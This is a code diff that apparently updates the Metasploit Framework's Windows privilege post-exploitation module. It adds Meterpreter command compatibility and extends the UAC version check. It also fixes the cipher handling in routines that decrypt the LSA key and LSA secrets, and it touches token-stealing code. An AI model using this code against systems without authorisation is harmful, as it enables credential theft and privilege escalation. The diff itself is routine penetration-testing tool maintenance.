@@ -1,8 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core/post/windows/accounts'
-require 'msf/core/post/windows/registry'
-
 module Msf::Post::Windows::Priv
   include ::Msf::Post::Windows::Accounts
   include Msf::Post::Windows::Registry
@@ -25,6 +22,23 @@ module Msf::Post::Windows::Priv
   UAC_PROMPT_CREDS = 3
   UAC_PROMPT_CONSENT = 4
   UAC_DEFAULT = 5
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_sys_config_*
+              stdapi_sys_process_*
+              stdapi_registry_*
+            ]
+          }
+        }
+      )
+    )
+  end
 
   #
   # Returns true if user is admin and false if not.
@@ -78,7 +92,7 @@ module Msf::Post::Windows::Priv
     rescue Rex::Post::Meterpreter::RequestError => e
       # It could raise an exception even when the token is successfully stolen,
       # so we will just log the exception and move on.
-      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+      elog(e)
     end
 
     true
@@ -127,7 +141,7 @@ module Msf::Post::Windows::Priv
     uac = false
     winversion = session.sys.config.sysinfo['OS']
 
-    if winversion =~ /Windows (Vista|7|8|2008|2012|10|2016)/
+    if winversion =~ /Windows (Vista|7|8|2008|2012|10|2016|2019)/
       unless is_system?
         begin
           enable_lua = registry_getvaldata(
@@ -309,6 +323,7 @@ module Msf::Post::Windows::Priv
       end
 
       rc4 = OpenSSL::Cipher.new("rc4")
+      rc4.decrypt
       rc4.key = md5x.digest
       lsa_key  = rc4.update(pol[12,48])
       lsa_key << rc4.final
@@ -359,6 +374,7 @@ module Msf::Post::Windows::Priv
     end
 
     aes = OpenSSL::Cipher.new("aes-256-cbc")
+    aes.decrypt
     aes.key = sha256x.digest
 
     vprint_status("digest #{sha256x.digest.unpack("H*")[0]}")
@@ -366,7 +382,7 @@ module Msf::Post::Windows::Priv
     decrypted_data = ''
 
     (60...policy_secret.length).step(16) do |i|
-      aes.decrypt
+      aes.reset
       aes.padding = 0
       decrypted_data << aes.update(policy_secret[i,16])
     end
@@ -392,7 +408,7 @@ module Msf::Post::Windows::Priv
       block_key = key[j..j+6]
       des_key = convert_des_56_to_64(block_key)
       d1 = OpenSSL::Cipher.new('des-ecb')
-
+      d1.decrypt
       d1.padding = 0
       d1.key = des_key
       d1o = d1.update(enc_block)
@@ -403,9 +419,9 @@ module Msf::Post::Windows::Priv
         j = key[j..j+7].length
       end
     end
-    dec_data_len = decrypted_data[0].ord
+    dec_data_len = decrypted_data[0,4].unpack('<L').first
 
-    return decrypted_data[8..8+dec_data_len]
+    return decrypted_data[8, dec_data_len]
 
   end
 
